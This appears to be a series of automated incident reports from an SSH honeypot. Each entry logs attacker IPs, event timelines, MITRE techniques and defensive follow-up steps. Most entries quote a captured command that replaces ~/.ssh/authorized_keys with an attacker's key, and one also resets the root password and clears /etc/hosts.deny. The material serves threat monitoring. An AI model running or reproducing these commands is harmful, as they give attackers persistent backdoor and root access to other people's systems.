### 🔴 HIGH · IR-33ddc37c26fb

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:44 |
| **Last Seen** | 2026-06-11 19:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:44:37` | `cowrie.session.connect` |
| `2026-06-11 19:44:37` | `cowrie.client.version` |
| `2026-06-11 19:44:37` | `cowrie.client.kex` |
| `2026-06-11 19:44:38` | `cowrie.login.success` |
| `2026-06-11 19:44:39` | `cowrie.session.params` |
| `2026-06-11 19:44:39` | `cowrie.command.input` |
| `2026-06-11 19:44:39` | `cowrie.command.failed` |
| `2026-06-11 19:44:40` | `cowrie.log.closed` |
| `2026-06-11 19:44:40` | `cowrie.session.params` |
| `2026-06-11 19:44:40` | `cowrie.command.input` |
| `2026-06-11 19:44:40` | `cowrie.session.file_download` |
| `2026-06-11 19:44:40` | `cowrie.log.closed` |
| `2026-06-11 19:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f537a121c0

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:44 |
| **Last Seen** | 2026-06-11 19:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:44:44` | `cowrie.session.connect` |
| `2026-06-11 19:44:44` | `cowrie.client.version` |
| `2026-06-11 19:44:45` | `cowrie.client.kex` |
| `2026-06-11 19:44:46` | `cowrie.login.success` |
| `2026-06-11 19:44:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3133160e51de

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:45 |
| **Last Seen** | 2026-06-11 19:45 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:MgXdNbtnarCt"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:45:08` | `cowrie.session.connect` |
| `2026-06-11 19:45:08` | `cowrie.client.version` |
| `2026-06-11 19:45:08` | `cowrie.client.kex` |
| `2026-06-11 19:45:10` | `cowrie.login.success` |
| `2026-06-11 19:45:11` | `cowrie.session.params` |
| `2026-06-11 19:45:11` | `cowrie.command.input` |
| `2026-06-11 19:45:11` | `cowrie.command.failed` |
| `2026-06-11 19:45:12` | `cowrie.log.closed` |
| `2026-06-11 19:45:12` | `cowrie.session.params` |
| `2026-06-11 19:45:12` | `cowrie.command.input` |
| `2026-06-11 19:45:13` | `cowrie.session.file_download` |
| `2026-06-11 19:45:13` | `cowrie.log.closed` |
| `2026-06-11 19:45:28` | `cowrie.session.params` |
| `2026-06-11 19:45:28` | `cowrie.command.input` |
| `2026-06-11 19:45:28` | `cowrie.log.closed` |
| `2026-06-11 19:45:29` | `cowrie.session.params` |
| `2026-06-11 19:45:29` | `cowrie.command.input` |
| `2026-06-11 19:45:29` | `cowrie.log.closed` |
| `2026-06-11 19:45:29` | `cowrie.session.params` |
| `2026-06-11 19:45:29` | `cowrie.command.input` |
| `2026-06-11 19:45:30` | `cowrie.session.file_download` |
| `2026-06-11 19:45:30` | `cowrie.log.closed` |
| `2026-06-11 19:45:30` | `cowrie.session.params` |
| `2026-06-11 19:45:30` | `cowrie.command.input` |
| `2026-06-11 19:45:30` | `cowrie.log.closed` |
| `2026-06-11 19:45:31` | `cowrie.session.params` |
| `2026-06-11 19:45:31` | `cowrie.command.input` |
| `2026-06-11 19:45:31` | `cowrie.log.closed` |
| `2026-06-11 19:45:31` | `cowrie.session.params` |
| `2026-06-11 19:45:31` | `cowrie.command.input` |
| `2026-06-11 19:45:31` | `cowrie.command.input` |
| `2026-06-11 19:45:32` | `cowrie.log.closed` |
| `2026-06-11 19:45:33` | `cowrie.session.params` |
| `2026-06-11 19:45:33` | `cowrie.command.input` |
| `2026-06-11 19:45:33` | `cowrie.log.closed` |
| `2026-06-11 19:45:33` | `cowrie.session.params` |
| `2026-06-11 19:45:33` | `cowrie.command.input` |
| `2026-06-11 19:45:34` | `cowrie.log.closed` |
| `2026-06-11 19:45:34` | `cowrie.session.params` |
| `2026-06-11 19:45:34` | `cowrie.command.input` |
| `2026-06-11 19:45:34` | `cowrie.log.closed` |
| `2026-06-11 19:45:35` | `cowrie.session.params` |
| `2026-06-11 19:45:35` | `cowrie.command.input` |
| `2026-06-11 19:45:35` | `cowrie.log.closed` |
| `2026-06-11 19:45:35` | `cowrie.session.params` |
| `2026-06-11 19:45:35` | `cowrie.command.input` |
| `2026-06-11 19:45:36` | `cowrie.log.closed` |
| `2026-06-11 19:45:36` | `cowrie.session.params` |
| `2026-06-11 19:45:36` | `cowrie.command.input` |
| `2026-06-11 19:45:36` | `cowrie.log.closed` |
| `2026-06-11 19:45:37` | `cowrie.session.params` |
| `2026-06-11 19:45:37` | `cowrie.command.input` |
| `2026-06-11 19:45:37` | `cowrie.log.closed` |
| `2026-06-11 19:45:37` | `cowrie.session.params` |
| `2026-06-11 19:45:37` | `cowrie.command.input` |
| `2026-06-11 19:45:38` | `cowrie.log.closed` |
| `2026-06-11 19:45:38` | `cowrie.session.params` |
| `2026-06-11 19:45:38` | `cowrie.command.input` |
| `2026-06-11 19:45:38` | `cowrie.log.closed` |
| `2026-06-11 19:45:39` | `cowrie.session.params` |
| `2026-06-11 19:45:39` | `cowrie.command.input` |
| `2026-06-11 19:45:39` | `cowrie.log.closed` |
| `2026-06-11 19:45:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6c6a4365c72

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:46 |
| **Last Seen** | 2026-06-11 19:46 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:46:17` | `cowrie.session.connect` |
| `2026-06-11 19:46:17` | `cowrie.client.version` |
| `2026-06-11 19:46:17` | `cowrie.client.kex` |
| `2026-06-11 19:46:25` | `cowrie.login.success` |
| `2026-06-11 19:46:27` | `cowrie.session.params` |
| `2026-06-11 19:46:27` | `cowrie.command.input` |
| `2026-06-11 19:46:27` | `cowrie.command.failed` |
| `2026-06-11 19:46:27` | `cowrie.log.closed` |
| `2026-06-11 19:46:28` | `cowrie.session.params` |
| `2026-06-11 19:46:28` | `cowrie.command.input` |
| `2026-06-11 19:46:28` | `cowrie.session.file_download` |
| `2026-06-11 19:46:28` | `cowrie.log.closed` |
| `2026-06-11 19:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ae9b6e0255f2

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:46 |
| **Last Seen** | 2026-06-11 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:46:35` | `cowrie.session.connect` |
| `2026-06-11 19:46:35` | `cowrie.client.version` |
| `2026-06-11 19:46:35` | `cowrie.client.kex` |
| `2026-06-11 19:46:36` | `cowrie.login.success` |
| `2026-06-11 19:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d5dd74e13b4

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:46 |
| **Last Seen** | 2026-06-11 19:46 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:46:43` | `cowrie.session.connect` |
| `2026-06-11 19:46:43` | `cowrie.client.version` |
| `2026-06-11 19:46:44` | `cowrie.client.kex` |
| `2026-06-11 19:46:44` | `cowrie.login.success` |
| `2026-06-11 19:46:45` | `cowrie.session.params` |
| `2026-06-11 19:46:45` | `cowrie.command.input` |
| `2026-06-11 19:46:45` | `cowrie.command.failed` |
| `2026-06-11 19:46:45` | `cowrie.log.closed` |
| `2026-06-11 19:46:46` | `cowrie.session.params` |
| `2026-06-11 19:46:46` | `cowrie.command.input` |
| `2026-06-11 19:46:46` | `cowrie.session.file_download` |
| `2026-06-11 19:46:46` | `cowrie.log.closed` |
| `2026-06-11 19:46:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a30d5c9c94a

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:46 |
| **Last Seen** | 2026-06-11 19:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:46:49` | `cowrie.session.connect` |
| `2026-06-11 19:46:49` | `cowrie.client.version` |
| `2026-06-11 19:46:49` | `cowrie.client.kex` |
| `2026-06-11 19:46:50` | `cowrie.login.success` |
| `2026-06-11 19:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30ac4d6969f3

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:47 |
| **Last Seen** | 2026-06-11 19:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:47:28` | `cowrie.session.connect` |
| `2026-06-11 19:47:28` | `cowrie.client.version` |
| `2026-06-11 19:47:28` | `cowrie.client.kex` |
| `2026-06-11 19:47:29` | `cowrie.login.success` |
| `2026-06-11 19:47:29` | `cowrie.session.params` |
| `2026-06-11 19:47:29` | `cowrie.command.input` |
| `2026-06-11 19:47:29` | `cowrie.command.failed` |
| `2026-06-11 19:47:30` | `cowrie.log.closed` |
| `2026-06-11 19:47:30` | `cowrie.session.params` |
| `2026-06-11 19:47:30` | `cowrie.command.input` |
| `2026-06-11 19:47:30` | `cowrie.session.file_download` |
| `2026-06-11 19:47:30` | `cowrie.log.closed` |
| `2026-06-11 19:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab6869fe7578

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:47 |
| **Last Seen** | 2026-06-11 19:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:47:33` | `cowrie.session.connect` |
| `2026-06-11 19:47:34` | `cowrie.client.version` |
| `2026-06-11 19:47:34` | `cowrie.client.kex` |
| `2026-06-11 19:47:35` | `cowrie.login.success` |
| `2026-06-11 19:47:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d1b67dee218

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:48 |
| **Last Seen** | 2026-06-11 19:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:48:08` | `cowrie.session.connect` |
| `2026-06-11 19:48:08` | `cowrie.client.version` |
| `2026-06-11 19:48:09` | `cowrie.client.kex` |
| `2026-06-11 19:48:09` | `cowrie.login.success` |
| `2026-06-11 19:48:10` | `cowrie.session.params` |
| `2026-06-11 19:48:10` | `cowrie.command.input` |
| `2026-06-11 19:48:10` | `cowrie.command.failed` |
| `2026-06-11 19:48:10` | `cowrie.log.closed` |
| `2026-06-11 19:48:11` | `cowrie.session.params` |
| `2026-06-11 19:48:11` | `cowrie.command.input` |
| `2026-06-11 19:48:11` | `cowrie.session.file_download` |
| `2026-06-11 19:48:11` | `cowrie.log.closed` |
| `2026-06-11 19:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc3dad1e6d55

| Field | Detail |
|---|---|
| **Source IP** | `183.36.126[.]68` |
| **First Seen** | 2026-06-11 19:48 |
| **Last Seen** | 2026-06-11 19:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:48:14` | `cowrie.session.connect` |
| `2026-06-11 19:48:14` | `cowrie.client.version` |
| `2026-06-11 19:48:14` | `cowrie.client.kex` |
| `2026-06-11 19:48:15` | `cowrie.login.success` |
| `2026-06-11 19:48:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.36.126[.]68` to AbuseIPDB if not already reported
- [ ] Block `183.36.126[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ad54a875d14

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:53 |
| **Last Seen** | 2026-06-11 19:53 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:53:02` | `cowrie.session.connect` |
| `2026-06-11 19:53:02` | `cowrie.client.version` |
| `2026-06-11 19:53:02` | `cowrie.client.kex` |
| `2026-06-11 19:53:03` | `cowrie.login.success` |
| `2026-06-11 19:53:04` | `cowrie.session.params` |
| `2026-06-11 19:53:04` | `cowrie.command.input` |
| `2026-06-11 19:53:04` | `cowrie.command.failed` |
| `2026-06-11 19:53:05` | `cowrie.log.closed` |
| `2026-06-11 19:53:05` | `cowrie.session.params` |
| `2026-06-11 19:53:05` | `cowrie.command.input` |
| `2026-06-11 19:53:05` | `cowrie.session.file_download` |
| `2026-06-11 19:53:05` | `cowrie.log.closed` |
| `2026-06-11 19:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18768c9c48ab

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:53 |
| **Last Seen** | 2026-06-11 19:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:53:09` | `cowrie.session.connect` |
| `2026-06-11 19:53:09` | `cowrie.client.version` |
| `2026-06-11 19:53:09` | `cowrie.client.kex` |
| `2026-06-11 19:53:11` | `cowrie.login.success` |
| `2026-06-11 19:53:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03807012f217

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
| **First Seen** | 2026-06-11 19:55 |
| **Last Seen** | 2026-06-11 19:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-11 19:55:05` | `cowrie.session.connect` |
| `2026-06-11 19:55:05` | `cowrie.client.version` |
| `2026-06-11 19:55:06` | `cowrie.client.kex` |
| `2026-06-11 19:55:07` | `cowrie.login.success` |
| `2026-06-11 19:55:08` | `cowrie.session.params` |
| `2026-06-11 19:55:08` | `cowrie.command.input` |
| `2026-06-11 19:55:08` | `cowrie.command.failed` |
| `2026-06-11 19:55:08` | `cowrie.log.closed` |
| `2026-06-11 19:55:09` | `cowrie.session.params` |
| `2026-06-11 19:55:09` | `cowrie.command.input` |
| `2026-06-11 19:55:09` | `cowrie.session.file_download` |
| `2026-06-11 19:55:09` | `cowrie.log.closed` |
| `2026-06-11 19:55:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.80.65[.]140` to AbuseIPDB if not already reported
- [ ] Block `170.80.65[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e62f1101c0a6

| Field | Detail |
|---|---|
| **Source IP** | `170.80.65[.]140` |
